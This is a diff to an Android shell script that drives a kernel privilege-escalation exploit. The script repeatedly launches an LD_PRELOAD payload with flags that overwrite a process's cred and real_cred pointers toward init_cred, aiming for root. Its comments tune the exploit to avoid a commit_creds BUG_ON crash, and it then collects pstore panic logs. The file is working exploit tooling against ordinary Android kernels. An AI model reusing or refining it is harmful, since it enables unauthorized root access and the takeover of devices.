@@ -67,24 +67,29 @@ while [ "$(getenforce 2>/dev/null)" = "Enforcing" ] && [ $E -lt 4 ]; do
   sleep 3
 done
 
-echo "=== PTR: cred 指针 → init_cred ===" >> $LOG
+echo "=== PTR mt48: 两轮换指针 (进程内 R/C 交替, 同一 task, 满帽 AND-gate) ===" >> $LOG
 KOARG=""
 [ -f $KO ] && KOARG="PSELECT_KO=$KO"
 [ -n "$KOARG" ] && echo "ko found: $KO" >> $LOG || echo "no ko at $KO (只验 root, 不 insmod)" >> $LOG
 P=0
-while [ ! -f /data/local/tmp/root_alive.txt ] && [ ! -f /data/local/tmp/ksu_done.txt ] && [ $P -lt 4 ]; do
+while [ ! -f /data/local/tmp/root_alive.txt ] && [ ! -f /data/local/tmp/ksu_done.txt ] && [ $P -lt 2 ]; do
   P=$((P+1))
   rm -f $RUNLOG
-  timeout 120 env \
+  # mt48: 单进程内 6 次尝试交替 R(real_cred)/C(cred) — 两写必须落同一 task,
+  # 所以不能像旧 PTR 那样每轮换进程。子进程满帽 AND-gate: 半程态不引爆
+  # commit_creds BUG_ON (今天 7/7 崩溃的机制)。
+  timeout 300 env \
     PSELECT_SLIDE_TRIGGER=1 \
     PSELECT_CRED=1 \
     PSELECT_PERF_CRED=1 \
-    PSELECT_RETRY=1 \
+    PSELECT_RETRY=6 \
     PSELECT_PTR_MODE=1 \
+    PSELECT_PTR_ALT=1 \
+    PSELECT_PTR_STRICT=1 \
     $KOARG \
-    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
+    LD_PRELOAD=$DST /system/bin/sleep 240 > $RUNLOG 2>&1
   echo "PTR round=$P rc=$?" >> $LOG
-  grep -a 'mt47:\|mt39:\|mt40:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
+  grep -a 'mt47:\|mt48:\|mt39:\|mt40:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
   # mt47b: PTR 后立即抓 pstore (若设备未崩, 无害; 若上轮崩过重启, 这里能拿到上一 boot 的 panic 栈)
   for PS in /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0; do
     if [ -f $PS ]; then
